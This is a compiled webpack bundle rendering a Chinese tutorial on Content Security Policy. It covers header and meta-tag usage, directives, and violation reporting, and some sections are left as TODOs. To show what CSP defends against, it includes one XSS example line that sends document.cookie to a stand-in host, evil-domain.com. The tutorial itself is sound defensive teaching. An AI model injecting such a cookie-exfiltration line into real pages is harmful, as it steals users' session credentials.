(window.webpackJsonp=window.webpackJsonp||[]).push([[348],{1174:function(t,s,a){"use strict";a.r(s);var e=a(15),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h2",{attrs:{id:"什么是csp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#什么是csp"}},[t._v("#")]),t._v(" 什么是CSP?")]),t._v(" "),a("p",[t._v("这里一段定义是来自于MDN社区")]),t._v(" "),a("blockquote",[a("p",[t._v("Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware.")])]),t._v(" "),a("p",[t._v("内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。")]),t._v(" "),a("p",[t._v("参考来源")]),t._v(" "),a("p",[t._v("https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP")]),t._v(" "),a("h2",{attrs:{id:"使用csp的两种方式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用csp的两种方式"}},[t._v("#")]),t._v(" 使用CSP的两种方式")]),t._v(" "),a("ul",[a("li",[t._v("通过服务器 HTTP 头部的 Content-Security-Policy 来指定")]),t._v(" "),a("li",[t._v("通过 HTML 文档的 meta 标签配置策略")])]),t._v(" "),a("p",[t._v("例如：")]),t._v(" "),a("p",[t._v("使用 HTTP 头部，这里的 policy 为策略字符串")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Content-Security-Policy: policy\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("使用 HTML meta 标签的方式")]),t._v(" "),a("div",{staticClass:"language-HTML line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("meta")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("http-equiv")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("Content-Security-Policy"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("content")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("default-src "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("; img-src https://*; child-src "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("none"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(";"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h2",{attrs:{id:"主要防范目标"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#主要防范目标"}},[t._v("#")]),t._v(" 主要防范目标")]),t._v(" "),a("p",[t._v("CSP主要是防范 XSS 攻击，以及报告 XSS 攻击，如果页面存在漏洞让 JS 脚本注入，CSP 能限制脚本的运行，然后把损失降到最小")]),t._v(" "),a("div",{staticClass:"language-Javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Image")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://www.evil-domain.com/steal-cookie.php?cookie="')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("CSP 是通过限制加载到页面上的资源、域或者协议来实现的，例如，一旦入侵者找到漏洞注入了XSS攻击，入侵者可以通过 图片Ping的方式发送敏感信息到外部网站。CSP 可以指定允许信任域名下的图片、Script和样式表被加载到页面上，及时入侵者 XSS 入侵成功也无法通过这些方式发送数据，保证网站一定程度上安全。")]),t._v(" "),a("p",[t._v("TODO 几个例子限制加载的资源")]),t._v(" "),a("p",[t._v("另外 CSP 也提供了只允许加载指定协议，例如HTTPS的资源，否则自动跳转到 HTTPS 版本。")]),t._v(" "),a("h2",{attrs:{id:"使用-csp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用-csp"}},[t._v("#")]),t._v(" 使用 CSP")]),t._v(" "),a("p",[t._v("当我们需要使用CSP生效就需要编写相应的策略，策略包括一系列指令组成和设置定的值组成。")]),t._v(" "),a("p",[t._v("例如，一个网站管理者允许内容来自信任的域名及其子域名")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Content-Security-Policy: default-src 'self' *.trusted.com\n\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("我们再看一条策略：")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com\n\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。")]),t._v(" "),a("p",[t._v("TODO 描述 行内脚本")]),t._v(" "),a("h2",{attrs:{id:"资源"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#资源"}},[t._v("#")]),t._v(" 资源")]),t._v(" "),a("host-source",[a("scheme-source",[a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v("self\nunsafe-inline\nunsafe-eva\nnone\nnonce-<base64值>\nstrict-dynamic\n")])])]),a("h3",{attrs:{id:""}},[a("a",{staticClass:"header-anchor",attrs:{href:"#"}},[t._v("#")])]),t._v(" "),a("p",[t._v("TODO 讲解这几种模式")]),t._v(" "),a("h2",{attrs:{id:"报告违规情况"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#报告违规情况"}},[t._v("#")]),t._v(" 报告违规情况")]),t._v(" "),a("p",[t._v("CSP 提供了另外一个非常有用的模式 - 报告模式，如果在 HTTP 头部指定 Content-Security-Policy-Report-Only 可以将发生了任何违规的事件都会被报告出去，但是这个头部只会对报告生效，实际生效还是需要 在Content-Security-Policy 中指定。")]),t._v(" "),a("p",[t._v("在报告的策略中需要配置一个 report-uri 用于服务器接受违规报告情况，例如：")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("\nContent-Security-Policy: default-src 'self'; report-uri http://reportcollector.example.com/collector.cgi\n\n\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("p",[t._v("浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。")]),t._v(" "),a("p",[t._v("数据包格式如下：")]),t._v(" "),a("div",{staticClass:"language-JSON line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-json"}},[a("code",[t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"csp-report"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"document-uri"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://example.com/signup.html"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"referrer"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"blocked-uri"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://example.com/css/style.css"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"violated-directive"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"style-src cdn.example.com"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"original-policy"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports\"")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br")])])])],1)],1)}),[],!1,null,null,null);s.default=n.exports}}]);